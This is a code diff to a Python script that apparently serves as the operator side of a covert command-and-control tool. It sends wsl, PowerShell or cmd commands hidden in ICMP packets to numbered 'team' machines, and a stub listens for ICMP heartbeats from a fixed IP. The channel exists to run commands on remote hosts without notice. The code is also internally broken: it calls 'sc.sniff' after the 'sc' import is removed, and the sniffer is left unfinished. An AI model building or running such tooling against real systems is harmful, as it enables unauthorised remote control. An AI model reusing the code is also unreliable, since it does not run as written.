@@ -1,4 +1,4 @@
-import scapy as sc
+from scapy.all import *
 import csv
 teams = []
 cmdproc = [["l", "wsl"], ["p", "powershell"], ["c", "cmd"]]
@@ -15,6 +15,11 @@ def setup():
             else:
                 teams[int(row[0]) - 1].append([row[1], row[2]])
     print(teams)
+    #Fork Point is here.
+
+def sniffer():
+    pkts = sc.sniff(filter="icmp and host 66.35.250.151")
+    #These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
 
 def main():
     setup()
@@ -34,11 +39,15 @@ def main():
                 print("Why a negative number")
         elif cmd == "send":
             send = []
-            send.append(input("Command:"))
             send.append(input("CMD Processor:"))
-            send.append(input("Target:")) # this is going to use the numbering system that is already in use for organization of the teams and their boxes
+            send.append(input("Command:"))
+            target = input("Target:") # this is going to use the numbering system that is already in use for organization of the teams and their boxes
             print(send)
-
+            msg = ''.join(send)
+            print(msg)
+            print(teams[int(target[0])-1][int(target[1])-1][1])
+            rpckt = sr1(IP(dst=teams[int(target[0])-1][int(target[1])-1][1])/ICMP()/msg)
+            print(rpckt.show())
 
 main()
 #The reason for so many inputs is because I want to see how im going to lay out the command structure. Once that is done
